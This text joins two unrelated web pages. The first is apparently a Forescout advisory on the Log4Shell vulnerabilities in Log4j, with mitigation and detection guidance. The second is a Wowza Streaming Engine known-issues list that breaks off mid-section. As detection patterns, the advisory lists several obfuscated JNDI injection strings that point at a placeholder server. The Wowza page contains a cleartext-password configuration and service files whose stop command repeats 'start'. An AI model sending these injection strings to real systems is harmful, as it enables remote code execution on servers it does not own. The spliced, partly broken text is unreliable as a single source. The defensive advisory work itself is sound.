On December 9, 2021, Apache published a zero-day vulnerability [(CVE-2021-44228)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228) for Apache Log4j being referred to as “Log4Shell”. This “critical” vulnerability (CVSS score: 10) allows a remote attacker to take control of an affected system. When exploited, this vulnerability allows an attacker to run arbitrary code on the device, giving full control over to the attacker. Any device exploited should be considered compromised, potentially along with any devices that trusted the compromised device. The vulnerability has been actively exploited.

On December 14, 2021, Apache confirmed another vulnerability that was identified impacting Apache Log4j utility (CVE-2021-45046). According to reports, this flaw (CVSS score: 9) could result in remote code execution, which stemmed from an “incomplete” fix for [CVE-2021-44228](https://thehackernews.com/2021/12/extremely-critical-log4j-vulnerability.html). Vulnerability CVE-2021-45046 has been actively exploited.

On December 18, 2021, a third vulnerability was identified. Tracked as CVE-2021-45105 (CVSS score: 7.5), the high severity Denial of Service (DoS) vulnerability affects all versions of the tool from 2.0-beta9 to 2.16.0.

For additional details about these vulnerabilities, affected versions and solutions, please reference the [Apache Logging Services alert](https://protect-us.mimecast.com/s/5uZVCkRV3phqqKgZH23q2N?domain=logging.apache.org).

## Impact on Forescout Products and Services

Forescout’s security team immediately commenced an investigation of its networks and has found no evidence of compromise at this time. Forescout has updated rules and signatures of Forescout’s security solutions to detect and block any attempt to exploit our platforms and keep our defenders on high alert. In addition, Forescout has identified potentially vulnerable services and is in the process of patching them.

Forescout has identified the affected products and components and is in the process of releasing updates for the customers. For the latest information on how to update your Forescout products, please refer to [KB Article #12049](https://forescout.force.com/support/s/article/Important-security-information-related-to-Apache-Log4j-utility-CVE-2021-44228) on our portal.

## Why are these Vulnerabilities Challenging?

Log4j is a logging library present in many Java applications and the vulnerabilities are a consequence of how Log4j processes log messages.

It allows the use of “lookup” features, where the user providing messages to be logged can specify variables that will be “looked up” via Log4j and appended into the message. Instead of a simple string, for instance, it can be a system or environment variable, or a call to a remote server. That allows attackers to inject calls to malicious servers that hosts malware or an instruction to leak sensitive information (such as access tokens) to attacker-controlled servers.

These remote calls are enabled by a Java feature called Java Naming and Directory Interface (JNDI), which supports protocols such as the Lightweight Directory Access Protocol (LDAP), Domain Name System (DNS), Remote Method Invocation (RMI), and Common Object Request Broker Architecture (CORBA). Technically, an exploit is a string of the form ${jndi:<service>:<malicious\_server>} that must be injected by an attacker into a vulnerable log4j instance.

Many Internet-facing machines, such as web servers, accept user input that is logged by a backend running Log4j without sanitization. That happens often even if the webserver itself does not run Log4j, but some business application uses information coming from the user via the webserver. This allows attackers to inject the malicious strings via HTTP requests, for instance, which is the biggest attack surface observed so far.

There are three complicating factors for this vulnerability. First, Log4j is not a single vulnerable application but a [widely-used component](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592), present in products ranging from [databases](https://github.com/apache/druid/pull/12051) to [web conferencing systems](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd). **Therefore, identifying vulnerable assets in a network is challenging**. Second, attackers have quickly found many ways to obfuscate exploits, so that **understanding if and how your organization is or was attacked is not easy**. For instance, one valid exploit is ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<malicious\_server>} which is not easy to immediately match to the ${jndi:<service>:<malicious\_server>} template we mentioned above.

The third complication lies in an incomplete fix for CVE-2021-44228. There have been two new vulnerabilities discovered: CVE-2021-45046 and CVE-2021-45105.

While the fix for CVE-2021-44228 disables JNDI for log messages, the variables used in the Log4j configuration files still could be expanded to JNDI lookups. Initially CVE-2021-45046 had a low CVSS score of 3.7 since it has been believed that the impact of this vulnerability is at most Denial-of-Service, and that the attackers must be able to control the configuration files. However, on some systems (MacOS at the time of this writing) researchers have discovered [a bypass](https://www.lunasec.io/docs/blog/log4j-zero-day-severity-of-cve-2021-45046-increased/) that allows to achieve full Remote Code Execution.

We have already hinted about the last of the discovered vulnerabilities CVE-2021-45105 in [Forescout Research Labs technical blog](https://github.com/Forescout/log4j_response). This vulnerability allows attackers to achieve Denial-of-Service on certain systems by adding specially crafted log variables that lead to infinite recursions and will cause stack overflows.

The root cause of all these three vulnerabilities is not only the fact that JNDI lookups were allowed without restriction, but chiefly because the variable parsing functionality is flawed. Thus, all three patches are mending the same fundamental issue. Yet, it may still be possible that researchers or attackers will soon discover new ways of circumventing these patches as well. **It is therefore imperative to update your system to the latest patch available as soon as that patch gets out**.

Refer to [our technical blog](https://github.com/Forescout/log4j_response) for more insights on detecting vulnerable systems and exploitation attempts.

## Protecting Your Network – Mitigations

### Identify Vulnerable Devices

**Vulnerable software/devices can be identified by:**

* Matching asset inventories with vendor advisories. See [here](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592) and [here](https://www.techsolvency.com/story-so-far/cve-2021-44228-log4j-log4shell/#who-affected) for a list of affected vendors.
* Analyzing software bill of materials (SBOM) manifests – which are still very rare – or software build pipeline dependency manifests – which are common in environments such as Maven – to identify the use of the vulnerable component.
* Searching the file systems of machines to identify class files, especially the JndiLookup.class which is used to access the remote services.
* Analyzing log files to identify entries coming from log4j and map them back to applications.

### Patch or Change Configurations

After vulnerable devices have been identified, Forescout recommends applying the latest security updates from Apache. Apache has released a new version of Log4j, version 2.17.0, to address the vulnerabilities.

* Apache CVE: [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)
* Apache CVE: [CVE-2021-45046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046)
* Apache CVE: [CVE-2021-45105](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45105)
* Apache security advisory: [Apache Log4j Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)

**Mitigation Risk on the Network:**

If sensitive devices are identified that cannot be immediately patched (e.g., a patch is not available), Forescout recommends mitigating the risk as follows.

* Use application tagging to identify those applications which you haven’t validated as patched and apply strict policies to them.
* Configure a firewall to allow outgoing traffic to a trusted whitelist of addresses and protocols, thus preventing attackers from communicating outside of the network.
* Carefully monitor for failed logins and token anomalies.
* Detect exploitation attempts by inspecting log files for the characteristic URL patterns. As mentioned above, attackers are currently using obfuscating techniques to avoid detection. A non-exhaustive [list of exploit patterns](https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce)that might help with detection includes:
  + ${jndi:ldap://<ip\_address>}
  + ${jndi:ldaps://<ip\_address>}
  + ${jndi:rmi://<ip\_address>}
  + ${${::-j}ndi:rmi://<ip\_address>}
  + ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://<ip\_address>}
  + ${${lower:jndi}:${lower:rmi}://<ip\_address>}
  + ${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://<ip\_address>}
  + ${jndi:dns://<ip\_addess>}

### Investigate Targeted Devices

If a device was the target of an exploit found by monitoring the network as described above, you can further investigate the incident by checking the logs for strings starting with “${jndi” or any of the exploit patterns above (there are grep [regular expressions](https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b) to help with that).

Once you have determined the device was actually compromised, proper containment, eradication and recovery processes should be taken, which include disconnecting the device, removing malware or malicious artifacts that have been dropped and determining when the system can be returned to production.

## How Forescout Can Help Mitigate Log4shell

Forescout R&D Teams have developed the following artifacts to help mitigate Log4Shell:

### Assess Your Risk: Finding Vulnerable Devices

eyeSight customers can install the [Security Policy Templates (SPT)](https://docs.forescout.com/bundle/spt-content-h/page/spt-content-h.About-Security-Policy-Templates.html) plugin version 21.0.11. The SPT allows to scan Windows and Linux hosts to identify which of those run applications that use the vulnerable Log4j library.

The SPT enumerates all Java Archive (JAR) files – packaged Java applications and libraries – on a scanned host and searches for the JndiLookup class on the found JAR files. When the class is found, it searches for version information available on build manifests (e.g., Maven properties.pom), file names (e.g., log4j-core-2.1.10), file hashes or even timestamps to try to determine whether the application is vulnerable or not.

Scanned hosts are grouped into Vulnerable, Potentially Vulnerable, Not Affected and Unknown.

We also intend future versions of the SPT to further help with forensic capabilities by scanning known log files for exploit patterns. Notice this will not be part of the first SPT release.

It is paramount to identify vulnerable and violated hosts. eyeInspect customers can leverage the richness of data collected and the analytical capabilities of the tool to investigate the network behaviors. Special attention should be given to egress traffic related to protocols like LDAP, DNS, and RMI. It is possible to build easily multiple analytical dashboards to assess the traffic and device behaviors.

These powerful logging and analysis capabilities are precious also to identify exploits happened while there was no threat detection: with eyeInspect it is easy to identify hosts that started using uncommon protocols or with suspicious behaviors, e.g. a node which started communicating yesterday through LDAP with an unknown server on the Internet.

### Identify Attacks: Detecting Ongoing Exploits

eyeInspect customers can update their Threat Detection Add-Ons script to version v.1.6 containing a detection strategy for CVE-2021-44228 exploitation attempts on HTTP. This is supported from eyeInspect 4.2.0 onwards. Figure 1 shows an example of an alert raised when an exploit is detected.

There is also a flash update of the OT Vulnerability & IoC Database to help detection of IoCs related to CVE-2021-44228. Some Log4Shell callbacks are reported to run over Tor; eyeInspect has a large list of Tor exit node IP addresses (6700, very recently updated). This update adds additional IP addresses reported as malicious on various sources and this list could have updates in the next days.

These Add-On tools will help you detect exploit attempts of the log4j vulnerability and identify indicators of already infected systems attempting to reach out to malicious IP addresses identified by various threat intel sources.

### Protect Your Organization: Segmenting the Network

eyeSegment customers can setup their systems to whitelist LDAP, DNS, and RMI traffic, which are being exploited in the wild, to only legitimate servers.

eyeSight can also help to isolate devices that are known to be vulnerable but cannot be patched by placing them in specific VLANs.

While it’s not possible to block OT networks in general, customers could set rules in the eyeInspect anomaly detection engine to raise alerts if LDAP, RMI or other sensitive protocols are used against non whitelisted destinations.

# Known issues with Wowza Streaming Engine

Updated on 11/20/2024 10:34 am PST

This article describes important issues that may affect your deployment, management, and use of Wowza Streaming Engine™ [media server software](https://www.wowza.com/products/streaming-engine). When available, workarounds and fixes for these issues are described. Check back often. This article is updated frequently as new developments occur.

> **Note:** Where a third-party issue affects Wowza Streaming Engine software, it's the responsibility of the third-party to fix the problem. Wowza Media Systems works with these companies to help address the issue as soon as possible.

## License server deprecation notice

---

Due to the age of our legacy licensing servers, we must shut them down by December 31, 2023.

**Wowza Media Server 2.x.x**, **3.x.x**, and **Wowza Streaming Engine 4.0.0 to 4.0.5** will only be impacted if the server doesn't already have DNS available.

##

## General issues

---

### Open general known issues

The following general known issues are not fixed in the latest version of Wowza Streaming Engine but may have a workaround.

#### Akamai stream targets not certified with Wowza Streaming Engine 4.9.0 and later

Akamai stream targets haven't yet been certified with Wowza Streaming Engine 4.9.0 and later.

##### Solution

If you're using Wowza Streaming Engine to send live streams to the Akamai HD network for distributed delivery, use Wowza Streaming Engine 4.8.28 or earlier.

#### REST API call to add a custom property to HTTPStreamer is added to LiveStreamPacketizer instead

When the REST API makes a PUT request to modify the parameter cupertinoChunkDurationTarget, it recognizes the path for live applications, but does not recognize the path for VOD applications.

##### Solution

Rename the parameter to CupertinoChunkDurationTargetVOD so that it differentiates between the live and VOD application paths.

#### Scaling issue of an image when using Beamr as a scaler

In Wowza Streaming Engine 4.8.20, if the dimensions (height and width) of an image are an even/odd or odd/even number of pixels, then scaling will fail. The Wowza Streaming Engine Manager shows an error:

sum of image Width and Height must be an even number.

##### Solution

Change the dimensions to either an odd or even number of pixels such that the sum of pixels is even. You can do this by cropping the original image.

#### Authentication Method – Cleartext is not compatible with Digest Authentication

In Wowza Streaming Engine 4.8.19, SHA-256 compatibility was added to update security standards. Because of the update, Cleartext is not compatible with Digest authentication out of the box.

##### Solution

There are two workarounds for this issue -

1. For a more secure method, follow this - If you use Digest with Cleartext and receive a failure to log in message, update your password encoding scheme to use SHA-256 in the **[install-dir]/conf/Server.xml** file and restart Wowza Streaming Engine to log in. For more information on this method, check this [article](/docs/how-to-change-the-authentication-method-for-the-wowza-streaming-engine-rest-api "https://www.wowza.com/docs/how-to-change-the-authentication-method-for-the-wowza-streaming-engine-rest-api#use-digest-authentication2").
2. You can also configure plaintext password using the below properties in **[install-dir/conf/Server.xml]**:

```

<AuthenticationMethod>basic</AuthenticationMethod>
<PasswordEncodingScheme>cleartext</PasswordEncodingScheme>
```

This method is less secure because the password is in plaintext.

#### Third-party dependency conflict

In Wowza Streaming Engine 4.8.18 and later, the jaxb-core and jaxb-runtime jars were updated to version 3.0.2 from version 2.3.3. This causes a conflict if you need to import classes from jakarta.xml.bind-api.

##### Solution

If you use these classes, we recommend running Wowza Streaming Engine 4.8.17 instead. We don’t recommend manually updating the JAR file because it may impact other sections of the workflow.

#### Load balancer stops working when configured for SSL

The load balancer SSL connection issue has been resolved. It is no longer necessary to roll back to a previous version of WSE. Customers who have experienced this issue will want to ensure they have installed latest load balancer module (build 17278+) for resolution.

#### Apache Log4j2 security vulnerabilities (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105)

Logging in Wowza Streaming Engine 4.8.8.01 and later uses a version of Apache Log4j2 with a security vulnerability (CVE-2021-44228) involving JNDI functionality that is not protected against attacker-controlled LDAP and other JNDI-related endpoints.

In addition, steps to mitigate CVE-2021-44228 in Apache Log4j 2.15.0 and 2.16.0 did not fully address security vulnerabilities. These issues are captured in CVE-2021-45046 and CVE-2021-45105.

#### Solution

We recommend Wowza Streaming Engine customers take action to address the recent Apache Log4j2 vulnerabilities by using our Log4j2 updater to get the latest Log4j2 files: see [Update to fix Apache Log4j2 security vulnerabilities](/docs/update-for-apache-log4j2-security-vulnerability "Update to fix Apache Log4j2 security vulnerabilities") to get the updater and for information about running it.

Although Wowza Streaming Engine 4.8.17 upgrades to Apache Log4j 2.16.0 to fix CVE-2021-44228 and CVE-2021-45046, it does *not* fix CVE-2021-45105, which is fixed in Apache Log4j 2.17.0.

> **Important:** You do *not* need to update to Wowza Streaming Engine 4.8.17 to get the latest fixes for Apache Log4j2-related issues.

Addressing recent Apache Log4j2 issues is a dynamic situation that we will continue to respond to based on Apache updates.

#### Insufficient memory when starting and stopping publishing frequently and using Beamr transcoding

Wowza Streaming Engine can crash when starting and stopping stream publishing frequently and using Beamr encoding or decoding due to insufficient physical memory (RAM). Depending on the amount of RAM, this may only occur after starting and stopping the stream frequently for many hours or multiple days.

#### Solution

There is no fix available at this time. On Linux, limiting the number of arenas allowed per CPU core can prevent this issue. See [Optimize Transcoder Memory Utilization (Linux Only)](/docs/tune-wowza-streaming-engine-for-optimal-performance#optimize-transcoder-memory-utilization-linux-only- "Tune Wowza Streaming Engine for optimal performance") for more information.

#### Streaming to Facebook from Wowza Streaming Engine 4.7.8 doesn't work on some versions of CentOS

There is a problem with the Facebook stream target destination in Wowza Streaming Engine 4.7.8 that breaks the ability to send streams to Facebook when Wowza Streaming Engine is running on some versions of CentOS.

#### Solution

There is no fix available at this time, but you may be able to use the generic RTMP stream target destination type to send streams to Facebook. For more information, see [Use RTMP to distribute live streams from Wowza Streaming Engine](/docs/how-to-use-rtmp-to-distribute-live-streams "Use RTMP to distribute live streams from Wowza Streaming Engine").

#### Erroneous log statements when accessing the Wowza Streaming Engine REST API over SSL

If you've enabled secure sockets layer (SSL) security for the Wowza Streaming Engine REST API, you may see the following warning statement in the logs even though the REST API queries are working properly:

WARNING: An error occurred during the communication with the remote HTTP server.

#### Solution

Disregard the erroneous log statements and use the Wowza Streaming Engine REST API as intended. No workaround is needed.

#### Misleading message when uninstalling Wowza Streaming Engine updaters (Wowza Streaming Engine 4.3.0-4.4.1)

After you uninstall updater versions 4.3.0, 4.3.0.01, 4.3.0.02, 4.3.003, 4.4.0, 4.4.0.01, and 4.4.1, you may see a message that indicates your updater uninstall may have failed:
```

A required action of the update failed. The update did not complete successfully, see the wowzastreamingengine_update.log for details.
```
#### Solution

This message can be misleading. Check for the following message. If it's present, your updater uninstall completed successfully:
```

Restoration complete
```

#### Startup delays and hostname resolution problems on Azure Marketplace virtual machines

When running Wowza Streaming Engine virtual machines on Azure Marketplace, the Wowza Streaming Engine software may start after some delay. After startup, Wowza Streaming Engine Manager may display the virtual machine's private IP address, instead of the public IP address, on the **Home**, **Sources (Live)**, and **Test Playback** pages. These problems are caused by the way in which Azure Marketplace processes variable lookup metadata.
#### Solution

Future Azure Marketplace releases may optimize how variable lookup metadata is reported in the Azure platform. To permanently display the public IP address in Wowza Streaming Engine Manager, do the following:

1. Connect to your virtual machine ([Windows connection instructions](Wowza-Streaming-Engine-for-Windows-on-Azure-Quick-Start-Guide#connect) | [Linux connection instructions](Wowza-Streaming-Engine-for-Linux-on-Azure-Quick-Start-Guide#connect)).
2. Open the **[install-dir]/conf/VHost.xml]** file in a text editor and replace the **<Manager>**/**<TestPlayer>**/**<IpAddress>** value (**${com.wowza.video.platform.PLATFORM\_METADATA\_EXTERNAL\_IP}**) with your virtual machine's public IP address:
   ```

   <Manager>
   	<TestPlayer>
   		<IpAddress>[wowza-vm-public-ip-address]</IpAddress> <!--changed for default video install. -->
   		<Port>${com.wowza.wms.HostPort.FirstStreamingPort}</Port>
   		<SSLEnable>${com.wowza.wms.HostPort.SSLEnable}</SSLEnable>
   	</TestPlayer>
   	<!-- Properties defined are used by the Manager -->
   	<Properties>
   	</Properties>
   </Manager>
   ```
3. If you were signed in to Wowza Streaming Engine Manager, sign out, and then sign in again.

The **Home**, **Sources (Live)**, and **Test Playback** pages in the manager should display the virtual machine's public IP address.
#### Wowza Streaming Engine services don't start automatically on Ubuntu 15.04

Wowza Streaming Engine services on Ubuntu 15.04 fail as part of the installation and don't start automatically. This appears to be related to the recent move by Ubuntu from **upstart** to **systemd** (see [SystemdForUpstartUsers](https://wiki.ubuntu.com/SystemdForUpstartUsers)).
#### Solution

Do ONE of the following:

Start Wowza Streaming Engine manually by running the following as root:
```

# /etc/init.d/WowzaStreamingEngine start

# /etc/init.d/WowzaStreamingEngineManager start
```

-OR-

Reinstall the missing upstart functionality, which should ensure that Wowza Streaming Engine services are restarted on reboots:
```

# apt-get install upstart-sysv
```

#### Latest Linux updates prevent Wowza Streaming Engine from starting (init.d or systemd)

Wowza Streaming Engine services fail to start--either as legacy init.d scripts or as systemd services--after Linux is updated. We've observed this with Centos 7.2 updates.
#### Solution

Create the following service files:

**/usr/lib/systemd/system/WowzaStreamingEngine.service**
```

[Unit]
Description=WowzaStreamingEngine
After=syslog.target
After=network.target
After=local-fs.target
After=remote-fs.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/local/WowzaStreamingEngine/bin/WowzaStreamingEngine start
ExecStop=/usr/local/WowzaStreamingEngine/bin/WowzaStreamingEngine start
RemainAfterExit=yes

# Give a reasonable amount of time for the server to start up/shut down
TimeoutSec=300

[Install]
WantedBy=multi-user.target
```

**/usr/lib/systemd/system/WowzaStreamingEngineManager.service**
```

[Unit]
Description=WowzaStreamingEngineManager
After=syslog.target
After=network.target
After=local-fs.target
After=remote-fs.target

[Service]
Type=simple
User=root
Group=root
ExecStart=/usr/local/WowzaStreamingEngine/manager/bin/WowzaStreamingEngineManager start
ExecStop=/usr/local/WowzaStreamingEngine/manager/bin/WowzaStreamingEngineManager start
RemainAfterExit=yes

# Give a reasonable amount of time for the server to start up/shut down
TimeoutSec=300

[Install]
WantedBy=multi-user.target
```

**Enable services**
```

systemctl daemon-reload
systemctl enable WowzaStreamingEngine.service
systemctl enable WowzaStreamingEngineManager.service
```

**Start new services**
```

systemctl start WowzaStreamingEngine.service
systemctl start WowzaStreamingEngineManager.service
```

#### Antivirus tools falsely detect Luhe.Fiha.AN threat

Some antivirus tools report "Found Luhe.Fiha.AN" in Windows Installer (.msi) files for Wowza Streaming Engine software.
#### Solution

We believe this to be a false positive. Customers haven't reported any problems.
#### Issues with Java version 8u78 and greater

If you [use your own Java Runtime Environment (JRE) (8u78 and greater) with Wowza Streaming Engine](how-to-manually-install-and-troubleshoot-java-on-your-wowza-media-server), you may not be able to start Wowza Streaming Engine Manager.

You may also encounter an instability issue related to Java settings and see an error message similar to the following:

```

500 error is thrown: "Sorry there was an error getting to (server/performance/javasettings/edit.htm):
Internal Server Error:500"
```
#### Solution

If you use your own JRE, you can install an earlier JRE version that doesn't have these issues (see [Manually install and troubleshoot Java on Wowza Streaming Engine](manually-install-and-troubleshoot-java-on-wowza-streaming-engine)) or you can run the latest Wowza Streaming Engine installer, which has an earlier version of the JRE. We'll monitor the Java updates and update this article with the latest findings.
#### Custom properties with leading and trailing blank spaces

If you use a text editor to add properties to Wowza Streaming Engine XML configuration files, you can't edit the property in Wowza Streaming Engine Manager if the property name or value has a leading (or trailing) blank space. For example, if you add the following property that has leading blank space in its name to an XML file:
```

<Property>
	<Name>  myCustomProperty</Name>
	<Value>12345</Value>
	<Type>String</Type>
</Property>
```

When Wowza Streaming Engine Manager starts, it will load the XML file, and then remove the leading blank space from the property name that it displays in its user interface. (It does this because leading and trailing blank spaces are a common source of configuration errors.) For the example property above, the manager will display this as **myCustomProperty** in its UI.

If you try to edit **myCustomProperty** in the manager, the property will be saved as a new property to the XML file.
```

<Property>
	<Name>  myCustomProperty</Name>
	<Value>12345</Value>
	<Type>String</Type>
</Property>
<Property>
	<Name>myCustomProperty</Name>
	<Value>67890</Value>
	<Type>String</Type>
</Property>
```
#### Solution

If your media server configuration requires a property with a leading or trailing blank space in its name or value, you must always edit this property in the configuration XML file using a text editor.
#### Updating to Wowza Streaming Engine 4.7.0 breaks existing configurations for HTTPS Manager connections

Updating to Wowza Streaming Engine 4.7.0 overwrites the **startmgr.bat** (Windows) or **startmgr****.sh** (Linux) file. This means that if you have configured Wowza Streaming Engine Manager to use a secure socket layer (SSL) certificate so that you can connect using HTTPS, that configuration is lost during the update.

#### Solution

After you have successfully updated to Wowza Streaming Engine 4.7.0, follow the instructions in [How to connect to Wowza Streaming Engine Manager over HTTPS](/docs/how-to-connect-to-wowza-streaming-engine-manager-over-https "How to connect to Wowza Streaming Engine Manager over HTTPS") to reconfigure HTTPS connections.

#### Metadata from Matrox Monarch HD encoders can't be processed by Akamai stream targets

The Matrox Monarch HD encoder sends metadata with encoded streams that goes through Wowza Streaming Engine but can't be processed when received by an Akamai RTMP CDN endpoint.
#### Solution

Add a custom property to the stream target that instructs the target to ignore the problematic metadata.

**Note:** Creating custom properties for a stream target requires an administrator user with advanced permissions.

1. In Wowza Streaming Engine Manager, select the live application that uses the Matrox Monarch encoder and the Akamai RTMP stream target.
2. In the contents panel, click **Stream Targets**.
3. Select the stream target that's sending the stream to Akamai.
4. Click the **Custom** tab, click **Edit**, and then click **Add Custom Property**.
5. In the **Add Custom Property** dialog box, specify:
   * **Name** - removeMetadataObjects
   * **Type** - Boolean
   * **Value** - true
6. Click **Add** and then click **Save**.
### Resolved general known issues

The following general known issues are fixed in at least the latest version of Wowza Streaming Engine, if not in earlier versions too.

#### Resolved: Stream targets fail to connect to Facebook

In Wowza Streaming Engine version 4.8.25 and earlier, stream targets fail to connect to Facebook business pages. This occurs because the onlyMe privacy permission is set by default when the Facebook stream target is created.

Solution

Upgrade to Wowza Streaming Engine 4.8.26. To avoid this issue on earlier versions of Wowza Streaming Engine, follow these steps when creating the Facebook stream target:

1. Select MyTimeline from the Video Destination dropdown.
2. Set the privacy to anything other than the onlyMe option.
3. Select Page from the Video Destination dropdown.
4. Save the stream target.

Resolved: Using connection codes to connect to Wowza Video results in stream targets that stay in Waiting status

With Wowza Streaming Engine 4.8.22, you won't be able to use a connection code to send a stream from Wowza Streaming Engine to Wowza Video. If you try, you'll see the stream target in Wowza Streaming Engine stays in a Waiting state.

Solution

Use a custom RTMP stream target instead or upgrade to Wowza Streaming Engine 4.8.23.

#### Resolved: Misconfigured Server.xml file lets anyone log in to Wowza Streaming Engine Manager

In Wowza Streaming Engine versions 4.8.19 through 4.8.20, if the Server.xml file is not configured correctly, anyone can log in to Wowza Streaming Engine Manager GUI with any random username and password.

##### Solution

We recommend upgrading to Wowza Streaming Engine 4.8.21 to resolve this issue.

#### Resolved: Decoding fails for some H.264 live and VOD sources

With Wowza Streaming Engine 4.8.13 and later, some live and VOD sources with H.264 video fail upon publishing or playback due to a decoding error. The error is logged with a message similar to the following:

```

ERROR 500 - H264Utils.decodeAVCC : java.lang.Exception: Expected to parse SPS of length 28 bytes, but 16 bits remained
```
#### Solution

Update to the latest version of Wowza Streaming Engine. This problem is fixed in Wowza Streaming Engine 4.8.15 and later.

#### Resolved: Slow memory leak with SRTP-based video sources, HLS, and large amounts of lost or out-of-order packets

With SRTP-based video sources (WebRTC or RTSP), HLS enabled (cupertinostreamingpacketizer), and large amounts of lost or out-of-order packets, the HLS packetizer can stop creating segments due to SRTP authentication and decryption failures and cause a slow memory leak. Wowza Streaming Engine logs indicate SRTP failures with the following message: SRTP authentication failed.

#### Solution

Update to the latest version of Wowza Streaming Engine. This problem is fixed in Wowza Streaming Engine 4.8.12 and later. To sort out-of-order packets for UDP transports, see [Turn on an RTP jitter buffer and packet loss logging (RTP and MPEG-TS) in Wowza Streaming Engine](/docs/how-to-turn-on-an-rtp-jitter-buffer-and-packet-loss-logging-rtp-and-mpeg-ts "Turn on an RTP jitter buffer and packet loss logging (RTP and MPEG-TS) in Wowza Streaming Engine") or [Set up WebRTC streaming with Wowza Streaming Engine](/docs/how-to-use-webrtc-with-wowza-streaming-engine "Set up WebRTC streaming with Wowza Streaming Engine").

#### Resolved: Publishing streams to Facebook with Facebook Live stream targets fails

Publishing streams to Facebook using the **Facebook Live** stream target fails as a result of a change in the Facebook Graph API to deprecate the **save\_vod** parameter for some requests.

#### Solution

Update to the latest version of Wowza Streaming Engine. This problem is fixed in Wowza Streaming Engine 4.8.8.01 and later.

As a workaround, you can publish streams to Facebook using the generic RTMP stream target and enabling RTMPS for the stream target by adding **"sendSSL":"true"** to the generic RTMP stream target entry in the **PushPublishMap.txt** file. See [Use RTMP to distribute live streams from Wowza Streaming Engine](/docs/how-to-use-rtmp-to-distribute-live-streams "Use RTMP to distribute live streams from Wowza Streaming Engine") for more information.

#### Resolved: Publishing multicast streams with Wowza Streaming Engine generates unnecessary network traffic

In some versions of Wowza Streaming Engine software, when publishing a stream to a multicast group, an IGMP join group message was also sent. The IGMP message results in unnecessary traffic on the network and may result in packet loss issues as well.
#### Solution

This is fixed in Wowza Streaming Engine 4.7.6 and later.

> **Note:** If, for some reason, you would like to continue sending IGMP join group messages with Wowza Streaming Engine 4.7.5.01 and later, you can configure the **sendIGMPJoinMsgWhenPublishing** property To enable the behavior of previous Wowza Streaming Engine releases, do the following:
>
> 1. In Wowza Streaming Engine Manager, click the Server tab and select **Virtual Host Setup** in the contents panel.
> 2. In the details page, click the Properties tab, and then click **Outgoing RTP Datagram** in the **Quick Links** bar.
> 3. In the **Outgoing RTP Datagram** section, click Edit.
> 4. Change the **sendIGMPJoinMsgWhenPublishing** value to **true** and then click **Save**. (The default value is **false**.)
> 5. Restart the server when prompted to apply the changes.

#### Resolved: Wowza Streaming Engine 4.7.7 can't be installed on macOS Catalina

New instances of Wowza Streaming Engine 4.7.7 or earlier can't be installed on macOS Catalina because the installer is a 32-bit executable. macOS Catalina requires 64-bit executables.

#### Solution

Wowza Streaming Engine 4.7.8 and later provides a 64-bit executable installer, making Wowza Streaming Engine installations compatible with macOS Catalina.

#### Resolved: Checking for incorrect Java version when updating to Wowza Streaming Engine 4.7.3 or 4.7.4

When updating Wowza Streaming Engine software to version 4.7.3 or 4.7.4, it checks for Java version 1.6.0 or later. However, Java version 1.7.0 is the minimum required version.
#### Solution

With Wowza Streaming Engine 4.7.5 and later, the updater checks for Java version 1.7.0 or higher.

> **Note:** You still must use Java version 1.7.0 - 1.8.0\_77 or use the Java version that is installed with Wowza Streaming Engine software (Oracle Java 1.8.0\_77). Versions newer than 1.8.0\_77 aren't supported. For more information, see [Download and install Java](https://www.wowza.com/docs/how-to-manually-install-and-troubleshoot-java-on-your-wowza-media-server#download).

#### Resolved: Wowza Streaming Engine 4.7.4 may experience problems sending streams to Wowza Video for transcoding

With Wowza Streaming Engine 4.7.4, the Stream Target functionality that enables you to send streams to Wowza Video for transcoding and delivery to users may not work.

> **Note:**This problem is limited to the Wowza Video target destination when configured for Wowza Video to transcode the stream. All other configurations of the Wowza Video and Wowza CDN stream targets work as expected in Wowza Streaming Engine 4.7.4.

#### Solution

Update to the latest version of Wowza Streaming Engine media server software. This problem is fixed in Wowza Streaming Engine 4.7.5. and later.

#### Resolved: Windows 10 may not start Wowza Streaming Engine services (Services error -1073741502)

The [NSSM service manager](https://nssm.cc/) can't open a console window when trying to start Wowza Streaming Engine services. This error may appear after a recent Windows 10 update.
#### Solution

[Update your Wowza Streaming Engine installation to Wowza Streaming Engine 4.7.0 or later](/docs/how-to-update-your-wowza-streaming-engine-installation "How to update your Wowza Streaming Engine installation"). If you can't or don't want to update your media server software, do the following:

1. Open an elevated Command Prompt window (press the Windows Logo+X keys, and then click **Command Prompt (Admin)** on the power user menu).
2. In the Command Prompt window, navigate to a Wowza Streaming Engine installation **bin** folder that has an NSSM EXE file installed. There are two possible locations: **[install-dir]/bin** and **[install-dir]/manager/bin**.
3. Run the following commands:
   ```

   nssm set [wowza-streaming-engine-service-name] AppNoConsole 1
   nssm set [wowza-streaming-engine-manager-service-name] AppNoConsole 1
   ```

You must use properly formatted **service names** in these commands. To get the service names, open the Services control panel (press the Windows Logo+R keys, and then type **services.msc** in the **Run** dialog box), right-click the **Wowza Streaming Engine** and **Wowza Streaming Engine Manager** services in the list, and then click **Properties**. The service name to use will be highlighted on the **General** tab in the **Properties** dialog box.

**Example commands for Wowza Streaming Engine 4.6.0**

```

nssm set WowzaStreamingEngine460 AppNoConsole 1
nssm set WowzaStreamingEngineManager460 AppNoConsole 1
```

#### Resolved: SHOUTCast and Icecast stream targets don't work (Wowza Streaming Engine 4.5.0)

Wowza Streaming Engine 4.5.0 software has an error that prevents the [SHOUTcast and Icecast stream targets](How-to-stream-to-SHOUTcast-and-Icecast) from working.
#### Solution

